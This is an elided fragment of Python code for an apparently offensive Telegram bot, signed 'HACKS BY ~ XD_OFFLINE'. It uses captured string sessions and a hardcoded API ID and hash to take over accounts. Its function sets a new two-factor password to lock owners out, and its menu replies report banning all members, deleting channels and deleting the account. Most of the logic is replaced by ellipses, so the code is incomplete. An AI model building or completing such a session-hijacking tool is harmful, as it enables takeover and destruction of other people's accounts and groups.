...
async def user2fa(strses):
  ...
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    ...
    try:
      ...
      await X.edit_2fa('VILLAN_XD~ISBEST')
...
HACKS BY ~ XD_OFFLINE `HEHE HELLO`
  ...
  async with bot.conversation(event.chat_id) as x:
    ...
    if res.text == "A":
      ...
      if len(i) > 3855:
        ...
        await event.reply(i + "\n\nThanks For using ME :) SETHAPAYALE ")
      ...
      await event.reply("Banning all members Thanks For using ME")
      ...
      await event.reply("Leaved the Channel/THAKS FOR USING ME")
      ...
      await event.reply("Deleted the ChanneL")
      ...
      await event.reply("DELETED ACC ENJOY\n\nThanks for using me")
      ...
      try:
        ...
        await event.respond("SEND THIS ERROR TO - @dv_kings\n**LOGS**\n" + str(e))
